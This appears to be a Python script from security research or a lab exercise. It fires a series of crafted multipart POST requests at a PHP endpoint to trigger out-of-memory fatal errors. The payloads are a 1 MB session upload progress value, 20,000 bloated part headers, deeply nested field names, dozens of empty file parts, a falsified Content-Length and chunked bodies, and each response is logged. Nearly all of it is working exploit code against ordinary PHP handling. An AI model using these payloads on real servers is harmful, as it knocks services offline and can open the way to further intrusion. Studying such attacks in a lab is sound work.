#!/usr/bin/env python3
"""Phase 1: fire the vendor-enumerated 618 OOM strategy combos at the 2M lab dir.
Each combo = one fatal-in-band attempt; log everything. All targets /lab/index.php."""
import sys, time
sys.path.insert(0, ".")
from fire import *

results = {}

def tag(name, resp):
    h, b, st, cl, _ = parse(resp)
    fat = b"Allowed memory size" in b
    print(f"[{name}] status={st} fatal={fat} len={len(b)}")
    print("   body[:400]:", b[:400])
    results[name] = resp
    with open("fires.log", "a") as f:
        f.write(f"14:5xZ [{name}] status={st} oom_fatal={fat} bodylen={len(b)} :: {b[:220]!r}\n")

sid = b"abcdef0123456789abcdef0123456789"

# S0 baseline: benign multipart (no fatal expected)
p = [part(b"a", b"1")]
h, b_ = multipart(p)
tag("S0-benign", req(h, b_))

# S1: 1MB progress value (Bastet-confirmed shape)
p = [part(b"PHPSESSID", sid), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * (1024 * 1024)),
     part(b"u", b"", filename=b"f.txt")]
h, b_ = multipart(p)
tag("S1-progress1MB", req(h, b_))

# S2: header-bloat part (thousands of tiny headers), advisory strategy 2
hdrs = [(f"X-{i}".encode(), b"v") for i in range(20000)]
p = [part(b"a", b"1", headers=hdrs)]
h, b_ = multipart(p)
tag("S2-hdrbloat20k", req(h, b_, timeout=120))

# S3: nested field names, strategy 4 (a[b][c]... deep)
deep = b"a" + b"[b]" * 200
p = [part(deep, b"1"), part(b"c[d][e][f][g][h]", b"2")]
h, b_ = multipart(p)
tag("S3-nested", req(h, b_))

# S4: empty file parts (strategy 3): filename set, zero-byte body
p = [part(b"PHPSESSID", sid), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"k")]
for i in range(30):
    p.append(part(f"uf{i}".encode(), b"", filename=b"e.txt"))
h, b_ = multipart(p)
tag("S4-emptyfiles30", req(h, b_))

# S5: lied content-length (declare 50, body is huge) - does Apache still feed parser?
p = [part(b"PHPSESSID", sid), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * (256 * 1024)),
     part(b"u", b"", filename=b"f.txt")]
h, b_ = multipart(p, content_length=50)
tag("S5-liedCL", req(h, b_, timeout=60))

# S6: chunked, no content-length (strategy 1) - passes post_max_size gate?
p = [part(b"PHPSESSID", sid), part(b"PHP_SESSION_UPLOAD_PROGRESS", b"K" * (256 * 1024)),
     part(b"u", b"", filename=b"f.txt")]
h, b_ = multipart(p, chunked=True)
tag("S6-chunked256k", req(h, b_, timeout=60))

print("\n== all done ==")
